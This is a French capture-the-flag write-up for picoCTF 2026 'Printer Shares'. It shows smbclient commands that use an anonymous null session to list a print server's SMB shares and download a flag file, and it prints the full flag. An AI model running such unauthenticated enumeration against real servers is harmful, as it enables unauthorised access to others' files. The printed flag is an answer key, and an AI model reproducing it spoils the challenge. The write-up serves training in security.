# 759 — Printer Shares

**Événement** : picoCTF 2026 · **Catégorie** : General Skills

> Synthèse rédigée à partir des sources publiques listées en fin de fiche : ce challenge a été
> résolu côté CyLab Academy, mais le writeup d'origine n'a pas été conservé.

## Énoncé

> Oops! Someone accidentally sent an important file to a network printer - can you retrieve it from
> the print server?

Seul outil nécessaire : `smbclient`.

## Analyse

« Network printer » et « print server » désignent SMB. Le serveur accepte une **session nulle**
(bind anonyme, sans identifiants) : `smbclient -L` avec `-N` liste les partages sans authentification
et révèle un partage applicatif nommé `shares` à côté du partage d'administration `IPC$`. Le fichier
imprimé par erreur y est accessible en lecture.

## Solution

1. Énumérer les partages en anonyme :

```bash
sudo apt install -y smbclient
smbclient -L //<HOST> -p <PORT> -N
# Sharename   Type   Comment
# shares      Disk
# IPC$        IPC    IPC Service
```

2. Se connecter au partage applicatif et récupérer le fichier :

```bash
smbclient //<HOST>/shares -p <PORT> -N
smb: \> ls
smb: \> get flag.txt
smb: \> exit
cat flag.txt
```

## Flag

```
picoCTF{5mb_pr1nter_5h4re5_7a400ec3}
```

Flag complet publié par le writeup Cdenton (transcription d'exécution, challenge « Printer Shares ») ;
préfixe corroboré par picoCTF Solutions. Le challenge voisin « Printer Shares 2 » a un autre flag
(`..._5ecure_...`).

## Sources

- [picoCTF Solutions — Printer Shares (picoCTF 2026)](https://picoctfsolutions.com/picoctf-2026-printer-shares)
- [Cdenton — picoCTF 2026 writeup](https://cdenton1.github.io/2026/03/19/picoCTF-26.html)
